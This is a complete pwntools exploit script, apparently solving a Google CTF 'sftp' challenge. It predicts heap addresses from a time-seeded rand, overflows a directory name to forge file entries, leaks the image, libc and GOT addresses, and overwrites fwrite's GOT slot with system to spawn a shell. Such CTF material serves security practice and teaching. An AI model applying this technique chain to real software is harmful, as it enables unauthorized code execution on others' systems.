#!/usr/bin/env python3

from pwn import *
from ctypes import CDLL

libc = CDLL('libc.so.6')
libc.srand(libc.time(0))

p = process('./sftp')  

malloc = lambda: (libc.rand() & 0x1fffffff) | 0x40000000 # this is a custom malloc function implemented for this challenge (defined in .init section of binary)

cd = lambda name: p.sendlineafter(b"sftp> ", b"cd " + name) 

def put(name, content, ret=False):
    filedata = malloc() # needs two mallocs because handle_put() 
                        # will call malloc() twice; one from new_entry() 
                        # and second from self
    malloc()
    p.sendlineafter(b"sftp> ", b"put " + name)
    p.sendline(str(len(content)).encode())
    p.send(content)
    if (ret):
        return filedata # for debug purposes

def get(name):
    p.sendlineafter(b"sftp> ", b"get " + name)
    size = p.recvline()
    return p.recvn(int(size))

def mkdir(name, ret=False): # handle_mkdir() will call new_entry which will call malloc()
    addr = malloc()
    p.sendlineafter(b"sftp>",b"mkdir " + name )
    if ret: 
        return addr # for debug purposes

def gen(name, addr, size=8):
    fdata = b""
    fdata += p64(0) # parent_directory; directory_entry pointer = 8 bytes
    fdata += p32(2) # type; entry_type = 4 bytes
    fdata += name.ljust(20, '\x00').encode() # name; #define name_max 20
    fdata += p64(size) # size; size_t = 8 bytes
    fdata += p64(addr) # data; char *data = 8 bytes
    return fdata

# Authenticate
p.sendlineafter(b"(yes/no)? ", b'yes')
p.sendlineafter(b"c01db33f@sftp.google.ctf's password: ", b"Steve") # password gotten from reverse enginerring authenticate() or bruteforce ;)

user_entry = malloc() # there's a malloc() in new_directory; this is first called in service_setup() (see generate_filesystem.py)
log.info("Got user entry address: 0x{:08x}".format(user_entry))
for _ in range(6): # six mallocs in total is called in constructor function (also called service_setup(); see generate_filesystem.py)
    malloc()

fdata = gen("leak", user_entry) # creating fake entry with char *data pointing to arbitrary location; user_entry in this case because we want to leak img base addr.
leak_entry = put(b"leak_entry", fdata, ret=True)
log.info("Got leak entry addr: 0x{:08x}".format(leak_entry))

ddata = b""
ddata += b"A"*(20 + 8 + 17*8)
ddata += p32(leak_entry)

test = mkdir(ddata, ret=True) # overflow in new_directory(); this will create a child entry with leak as our name (see line 55)
cd(b"AAAAAAAAAAAAAAAAAAAA\x10")

for i in range(17): # new_directory will memset first 16 child entries to 0 leaving the 17th (out custom entry) still accessible to us
    put(str(i).encode(), b'A')

home_entry = struct.unpack("<Q", get(b'leak'))[0] # content of leak_entry will be a fixed location found in .data section which will help us calculate other addresses such as imgbase, etc.
img_base = home_entry - 0x208be0
got_plt = img_base + 0x205018
got_fwrite = got_plt + 192
libc_start_main = img_base + 0x204fe0

log.success("Got img base: 0x{:08x}".format(img_base))

fdata = gen("leak", libc_start_main, size=8) # now we want to leak libc's base address, repeat process.
fdata_addr = put(b"libc", fdata, ret=True)

ddata = b""
ddata += b"B"*(20 + 8 + 17*8)
ddata += p32(fdata_addr)

mkdir(ddata)
cd(b"BBBBBBBBBBBBBBBBBBBB\x10")

for i in range(17):
    put(str(i).encode(), b'A')

libc_start_main = struct.unpack("<Q", get(b'leak'))[0]
libc_base = libc_start_main - 0x27730
libc_system = libc_base + 0x49860
log.success("Got libc base: 0x{:08x}".format(libc_base))

fdata = gen("leak", got_fwrite) # now we want to leak fwrite's address in .got, repeat process.
fdata_addr = put(b"got", fdata, ret=True)

ddata = b""
ddata += b"C"*(20 + 8 + 17*8)
ddata += p32(fdata_addr)

mkdir(ddata)
cd(b"CCCCCCCCCCCCCCCCCCCC\x10")

for i in range(17):
    put(str(i).encode(), b'A')

fwrite = struct.unpack("<Q", get(b'leak'))[0]
log.success("Got fwrite: 0x{:08x}".format(fwrite))

fdata = gen("got", got_fwrite)
fdata_addr = put(b"overwrite", fdata, ret=True)

ddata = b""
ddata += b"D"*(20 + 8 + 17*8)
ddata += p32(fdata_addr)

mkdir(ddata)
cd(b"DDDDDDDDDDDDDDDDDDDD\x10")

for i in range(17):
    put(str(i).encode(), b'A')

put(b"systemarg", "/bin/bash") # putting system()'s argument in memory; this will be something like char *buf = /bin/bash
put(b"got", p64(libc_system)) # overwriting fwrite's entry in .got with __libc_system

p.sendlineafter(b"sftp> ", b"get systemarg") # finally, when fwrite(char *buf) is called, system(/bin/bash) is called instead 

p.interactive() # shell :)